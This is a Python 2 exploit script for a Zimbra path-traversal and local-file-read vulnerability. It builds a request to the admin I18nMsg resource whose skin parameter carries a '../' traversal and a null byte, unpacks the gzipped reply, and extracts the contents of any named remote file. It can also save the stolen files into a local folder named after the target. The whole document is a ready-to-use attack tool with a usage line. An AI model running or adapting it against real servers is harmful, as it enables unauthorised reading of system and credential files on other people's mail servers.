'''
Copyright [2016] [soxfmr@foxmail.com]

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
'''

import re
import sys
import gzip
import urllib2
from os import path
from os import mkdir
from urlparse import urlsplit
from StringIO import StringIO


TAG_FAILED = '// properties for I18nMsg not found'
TAG_START = 'a=I18nMsg;'
TAG_END = 'if (!window.I18nMsg) { I18nMsg = {}; }'

URL_BASE = '/zimbraAdmin/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../%s%%00'

def zimbra_cat(url, remotefile):
    # Remove the slash if exists to evade the issue in Zimbra
    # There should be only one slash present
    target = '{}{}'.format(url.strip('/'), URL_BASE % remotefile)

    res = urllib2.urlopen(target)
    io = StringIO(res.read())
    text = gzip.GzipFile(fileobj=io).read()

    if text:
        if TAG_FAILED in text:
            return False

        # Do the trick, skip the first keyword
        data = text[300:]
        start = data.find(TAG_START)
        if not start:
            return False

        # print '[+] Start offset found.'
        end = data.find(TAG_END, start)
        if not end:
            return False

        # print '[+] End offset found.'
        filedata = []
        data = data[start:end].split('\n')
        for line in data:
            matches = re.match('a\.(.*?)="(.*?)";', line)
            if not matches:
                matches = re.match('a\["(.*?)"\]="(.*?)";', line)
            if matches:
                filedata.append(' '.join(matches.groups()))

        return filedata

def main():
    if len(sys.argv) < 3:
        print 'Usage: read.py <url> <file> [-s]\n'
        print ' Optional:'
        print '    -s Save remote file to local as the same name'
        sys.exit(-1)

    url, remotefile = sys.argv[1], sys.argv[2]
    saved = len(sys.argv) >= 4

    filedata = zimbra_cat(url, remotefile)
    if not filedata:
        print 'File {} not found or permission deined.'.format(remotefile)
        sys.exit(-1)

    print '=============== {} ==============='.format(remotefile)

    for i in range(len(filedata)):
        line = filedata[i].replace('\\"', '"')
        filedata[i] = line
        print line

    # Save file
    if saved:
        folder = urlsplit(url).hostname.replace('.', '_')
        if not path.exists(folder):
            mkdir(folder)

        filename = path.join(folder, path.basename(remotefile))
        with open(filename, 'w+') as handle:
            for line in filedata:
                handle.write('{}\n'.format(line))

if __name__ == '__main__':
    main()
